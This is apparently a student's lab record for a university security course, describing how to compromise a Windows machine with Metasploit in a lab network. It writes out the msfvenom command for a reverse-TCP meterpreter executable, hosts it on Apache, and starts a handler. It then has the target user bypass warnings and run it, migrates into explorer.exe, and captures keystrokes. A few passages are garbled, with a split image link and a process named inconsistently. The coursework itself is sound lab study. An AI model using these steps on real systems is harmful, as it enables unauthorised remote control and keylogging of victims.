# NAME:Vidhysri
# REG NO:212222230170

# EX N0 6Compromising-windows-using-Metasploit

# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
![image](https://github.com/user-attachments/assets/097d17c5-4e10-4a6b-9b85-b1bab7d4160f)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
![image](https://github.com/user-attachments/assets/daaa5557-e3b0-4ad0-b8b4-0db85d4b7e85)

copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/user-attachments/assets/3abe35a2-6a3c-4f99-83f2-454ba8c08041)

Start apache server sudo systemctl apache2 start
![image](https://github.com/user-attachments/assets/0c8393b4-70e6-4aa6-bb26-2bc5e59bb1fb)

Check the status of apache2
![image](https://github.com/user-attachments/assets/46d8137b-302c-47ff-b99c-16be37e06e62)

Invoke msfconsole:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole. 87b2-3ede-4fb4-ad00-07eff0c29eec) Starting a command and control Server use multi/handler

![image](https://github.com/user-attachments/assets/c409

set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/user-attachments/assets/c0b040de-1a27-4013-a349-40a4dda9576e)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/user-attachments/assets/f2cc50cc-8dee-43fd-b815-7408c4e818b5)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
![image](https://github.com/user-attachments/assets/1e718458-6c6d-4e99-adac-3769ad3a5dc9)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![image](https://github.com/user-attachments/assets/5a30eef4-522c-468f-9a88-ab5534ca4de4)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/user-attachments/assets/178560e4-1741-4036-9e60-783728362fda)

keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/user-attachments/assets/8a307ebd-e45c-4d6a-8f29-63471bbe6f94)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
